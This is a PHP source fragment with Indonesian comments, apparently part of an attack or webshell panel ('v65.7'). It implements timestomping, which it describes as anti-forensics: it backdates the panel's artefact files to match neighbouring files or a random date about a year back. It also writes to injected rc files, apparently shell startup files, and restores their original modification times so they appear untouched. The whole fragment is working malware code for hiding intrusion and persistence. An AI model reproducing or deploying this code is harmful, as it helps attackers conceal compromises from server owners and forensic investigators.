/* ================= TIMESTOMP (baru v65.7) =================
   Anti-forensik mtime: file artefak panel mengikuti waktu file tetangga
   (mtime regular terbaru di folder yang sama) atau fallback tahun lalu;
   file rc yang disuntik DIKEMBALIKAN ke mtime semula — tampak tidak pernah
   berubah. Murni is_file/filemtime/touch — tanpa exec, PHP 4.x s/d 8.5. */
function gsp_stealth_age($path) {
    $now = time();
    $max = $now - 3600;                             // jangan pernah lebih baru dari 1 jam lalu
    $t = false;
    $dir = dirname($path);
    $items = @scandir($dir);
    if (is_array($items)) foreach ($items as $fn) {
        if ($fn === '.' || $fn === '..') continue;
        $p = $dir . '/' . $fn;
        if ($p === $path) continue;                 // jangan ikutkan diri sendiri
        if (!@is_file($p)) continue;                // file reguler saja
        $mt = @filemtime($p);
        if ($mt === false || $mt > $max) continue;  // clock skew (>time()) & tetangga terlalu segar:
                                                    // hasilnya pasti kena clamp — ambil yang sudah memenuhi clamp
        if ($t === false || $mt > $t) $t = $mt;     // tetangga paling baru
    }
    if ($t === false) {
        $dm = @filemtime($dir);
        if ($dm !== false && $dm <= $max) $t = $dm; // fallback: mtime folder (yang sudah memenuhi clamp)
    }
    if ($t === false) $t = $now - rand(90, 400) * 86400 - rand(0, 86399); // fallback: tahun lalu
    if ($t > $max) $t = $max;                       // clamp akhir (sabuk pengaman)
    $min = @strtotime('2008-01-01'); if ($min === false || $min === -1) $min = 1199145600;
    if ($t < $min) $t = $min;
    return @touch($path, $t, $t) ? $t : false;
}
/* tulis file rc sambil menjaga mtime asli (rc tampak tidak pernah berubah);
   rc BARU (belum ada sebelumnya) di-stealth-age mengikuti folder home */
function gsp_rc_write_stealth($rc, $content) {
    $existed = @is_file($rc);
    $old = $existed ? @filemtime($rc) : false;
    $ok = @file_put_contents($rc, $content);
    if ($ok === false) return false;
    if ($old !== false && $old !== 0) @touch($rc, $old, $old);
    elseif (!$existed) gsp_stealth_age($rc);
    return $ok;
}

